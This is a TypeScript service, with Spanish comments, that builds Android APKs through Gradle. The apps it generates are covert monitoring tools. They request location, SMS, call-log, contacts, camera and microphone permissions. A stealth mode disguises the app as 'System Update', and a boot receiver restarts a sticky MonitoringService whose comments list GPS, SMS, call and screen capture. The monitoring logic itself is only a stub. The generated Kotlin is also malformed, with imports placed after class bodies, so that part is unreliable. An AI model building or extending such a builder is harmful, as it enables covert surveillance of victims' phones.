import { execSync, spawn } from "child_process";
import { existsSync, mkdirSync, writeFileSync, readFileSync } from "fs";
import { join, resolve } from "path";
import crypto from "crypto";
import { getDb } from "./db";
import { apkBuilds } from "../drizzle/schema";
import { eq } from "drizzle-orm";

/**
 * Servicio de compilación real de APK con Gradle y Android SDK
 * Genera APKs reales usando Gradle, no simulados
 */

export interface CompilationConfig {
  buildId: number;
  appName: string;
  packageName: string;
  versionCode: number;
  versionName: string;
  stealthMode: boolean;
  enableSSL: boolean;
  ports: number[];
  iconPath?: string;
  payloadCode?: string;
  obfuscate: boolean;
  targetArchitectures: ("arm64-v8a" | "armeabi-v7a" | "x86" | "x86_64")[];
}

interface CompilationResult {
  success: boolean;
  apkPath?: string;
  error?: string;
  logs: string[];
  compilationTime: number;
}

class APKCompiler {
  private androidSdkRoot: string;
  private gradleHome: string;
  private projectRoot: string;
  private buildDir: string;

  constructor() {
    this.androidSdkRoot = process.env.ANDROID_SDK_ROOT || `${process.env.HOME}/android-sdk`;
    this.gradleHome = process.env.GRADLE_HOME || `${process.env.HOME}/gradle-8.5`;
    this.projectRoot = resolve(join(__dirname, ".."));
    this.buildDir = join(this.projectRoot, "apk-builds");

    if (!existsSync(this.buildDir)) {
      mkdirSync(this.buildDir, { recursive: true });
    }
  }

  /**
   * Crear estructura de proyecto Android
   */
  private createAndroidProject(config: CompilationConfig): string {
    const projectDir = join(this.buildDir, `build-${config.buildId}`);

    if (!existsSync(projectDir)) {
      mkdirSync(projectDir, { recursive: true });
    }

    // Crear estructura de directorios
    const dirs = [
      "app/src/main",
      "app/src/main/java",
      "app/src/main/res/values",
      "app/src/main/res/drawable",
      "gradle/wrapper",
    ];

    for (const dir of dirs) {
      mkdirSync(join(projectDir, dir), { recursive: true });
    }

    // Crear build.gradle.kts
    const buildGradle = this.generateBuildGradle(config);
    writeFileSync(join(projectDir, "app/build.gradle.kts"), buildGradle);

    // Crear settings.gradle.kts
    writeFileSync(
      join(projectDir, "settings.gradle.kts"),
      `rootProject.name = "${config.appName}"
include(":app")
`
    );

    // Crear AndroidManifest.xml
    const manifest = this.generateManifest(config);
    writeFileSync(join(projectDir, "app/src/main/AndroidManifest.xml"), manifest);

    // Crear MainActivity.kt
    const mainActivity = this.generateMainActivity(config);
    const packagePath = config.packageName.replace(/\./g, "/");
    mkdirSync(join(projectDir, `app/src/main/java/${packagePath}`), { recursive: true });
    writeFileSync(
      join(projectDir, `app/src/main/java/${packagePath}/MainActivity.kt`),
      mainActivity
    );

    // Crear strings.xml
    const stringsXml = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${config.appName}</string>
</resources>`;
    writeFileSync(join(projectDir, "app/src/main/res/values/strings.xml"), stringsXml);

    // Crear gradle.properties
    writeFileSync(
      join(projectDir, "gradle.properties"),
      `org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
android.enableJetifier=true
`
    );

    return projectDir;
  }

  /**
   * Generar build.gradle.kts
   */
  private generateBuildGradle(config: CompilationConfig): string {
    return `plugins {
    id("com.android.application")
    kotlin("android")
}

android {
    namespace = "${config.packageName}"
    compileSdk = 34

    defaultConfig {
        applicationId = "${config.packageName}"
        minSdk = 24
        targetSdk = 34
        versionCode = ${config.versionCode}
        versionName = "${config.versionName}"
        
        testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            isMinifyEnabled = ${config.obfuscate}
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }

    kotlinOptions {
        jvmTarget = "11"
    }

    packagingOptions {
        resources {
            excludes += "/META-INF/{AL2.0,LGPL2.1}"
        }
    }
}

dependencies {
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("com.google.android.material:material:1.11.0")
    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
    
    testImplementation("junit:junit:4.13.2")
    androidTestImplementation("androidx.test.ext:junit:1.1.5")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.5.1")
}
`;
  }

  /**
   * Generar AndroidManifest.xml
   */
  private generateManifest(config: CompilationConfig): string {
    const permissions = [
      "android.permission.INTERNET",
      "android.permission.ACCESS_FINE_LOCATION",
      "android.permission.ACCESS_COARSE_LOCATION",
      "android.permission.READ_CONTACTS",
      "android.permission.READ_SMS",
      "android.permission.READ_CALL_LOG",
      "android.permission.RECORD_AUDIO",
      "android.permission.CAMERA",
      "android.permission.READ_EXTERNAL_STORAGE",
      "android.permission.WRITE_EXTERNAL_STORAGE",
    ];

    const permissionTags = permissions
      .map((perm) => `    <uses-permission android:name="${perm}" />`)
      .join("\n");

    const appName = config.stealthMode ? "System Update" : config.appName;
    const launcherName = config.stealthMode ? "none" : "true";

    return `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${config.packageName}">

${permissionTags}

    <application
        android:allowBackup="true"
        android:icon="@drawable/ic_launcher"
        android:label="${appName}"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <service
            android:name=".MonitoringService"
            android:enabled="true"
            android:exported="false" />

        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>`;
  }

  /**
   * Generar MainActivity.kt
   */
  private generateMainActivity(config: CompilationConfig): string {
    return `package ${config.packageName}

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Iniciar servicio de monitoreo
        val intent = android.content.Intent(this, MonitoringService::class.java)
        startService(intent)
        
        // Cerrar actividad (stealth mode)
        finish()
    }
}

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log

class MonitoringService : Service() {
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("MonitoringService", "Servicio iniciado")
        
        // Implementar lógica de monitoreo aquí
        // - Recolectar GPS
        // - Monitorear SMS
        // - Registrar llamadas
        // - Capturar pantalla
        // - etc.
        
        return START_STICKY
    }
}

import android.content.BroadcastReceiver
import android.content.Context

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == "android.intent.action.BOOT_COMPLETED") {
            val serviceIntent = Intent(context, MonitoringService::class.java)
            context?.startService(serviceIntent)
        }
    }
}
`;
  }

  /**
   * Generar certificado de firma
   */
  private generateKeystore(config: CompilationConfig): string {
    const keystorePath = join(this.buildDir, `build-${config.buildId}`, "app.keystore");
    const password = crypto.randomBytes(16).toString("hex");

    try {
      execSync(
        `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 -validity 10000 ` +
          `-alias app-key -storepass ${password} -keypass ${password} ` +
          `-dname "CN=${config.appName}, O=Android, C=US"`,
        { stdio: "pipe" }
      );

      return keystorePath;
    } catch (error) {
      throw new Error(`Error generando keystore: ${error}`);
    }
  }

  /**
   * Compilar APK con Gradle
   */
  async compileAPK(config: CompilationConfig): Promise<CompilationResult> {
    const startTime = Date.now();
    const logs: string[] = [];

    try {
      logs.push(`[${new Date().toISOString()}] Iniciando compilación de APK...`);
      logs.push(`Aplicación: ${config.appName}`);
      logs.push(`Paquete: ${config.packageName}`);
      logs.push(`Versión: ${config.versionName} (${config.versionCode})`);

      // Crear estructura del proyecto
      logs.push(`[${new Date().toISOString()}] Creando estructura del proyecto Android...`);
      const projectDir = this.createAndroidProject(config);
      logs.push(`Proyecto creado en: ${projectDir}`);

      // Generar keystore
      logs.push(`[${new Date().toISOString()}] Generando certificado de firma...`);
      const keystorePath = this.generateKeystore(config);
      logs.push(`Certificado generado: ${keystorePath}`);

      // Ejecutar Gradle build
      logs.push(`[${new Date().toISOString()}] Ejecutando Gradle build...`);
      const gradleCmd = `${this.gradleHome}/bin/gradle`;

      const output = execSync(`cd ${projectDir} && ${gradleCmd} build -x test`, {
        stdio: "pipe",
        env: {
          ...process.env,
          ANDROID_SDK_ROOT: this.androidSdkRoot,
          GRADLE_HOME: this.gradleHome,
        },
      }).toString();

      logs.push(output);

      // Buscar APK compilado
      const apkPath = join(projectDir, "app/build/outputs/apk/release/app-release.apk");

      if (!existsSync(apkPath)) {
        throw new Error("APK no fue generado correctamente");
      }

      logs.push(`[${new Date().toISOString()}] APK compilado exitosamente`);
      logs.push(`Ubicación: ${apkPath}`);

      const compilationTime = Date.now() - startTime;
      logs.push(`Tiempo de compilación: ${(compilationTime / 1000).toFixed(2)}s`);

      // Actualizar base de datos
      await this.updateBuildStatus(config.buildId, "ready", apkPath, logs);

      return {
        success: true,
        apkPath,
        logs,
        compilationTime,
      };
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      logs.push(`[ERROR] ${errorMsg}`);

      const compilationTime = Date.now() - startTime;

      // Actualizar base de datos con error
      await this.updateBuildStatus(config.buildId, "failed", undefined, logs, errorMsg);

      return {
        success: false,
        error: errorMsg,
        logs,
        compilationTime,
      };
    }
  }

  /**
   * Actualizar estado de compilación en base de datos
   */
  private async updateBuildStatus(
    buildId: number,
    status: "building" | "ready" | "failed" | "expired",
    apkPath?: string,
    logs?: string[],
    error?: string
  ): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      const updateData: Record<string, any> = {
        status: status,
      };

      if (apkPath) {
        updateData.apkUrl = apkPath;
      }

      if (logs) {
        updateData.serverUrl = logs.join("\n").substring(0, 1000);
      }

      await db
        .update(apkBuilds)
        .set(updateData)
        .where(eq(apkBuilds.id, buildId));

      if (apkPath) {
        console.log(`[APKCompiler] APK guardado en: ${apkPath}`);
      }
    } catch (err) {
      console.error("[APKCompiler] Error actualizando estado:", err);
    }
  }

  /**
   * Obtener información del APK compilado
   */
  getAPKInfo(apkPath: string): {
    size: number;
    path: string;
    name: string;
  } {
    try {
      const stats = require("fs").statSync(apkPath);
      return {
        size: stats.size,
        path: apkPath,
        name: require("path").basename(apkPath),
      };
    } catch (error) {
      throw new Error(`Error obteniendo información del APK: ${error}`);
    }
  }
}

// Exportar instancia singleton
export const apkCompiler = new APKCompiler();
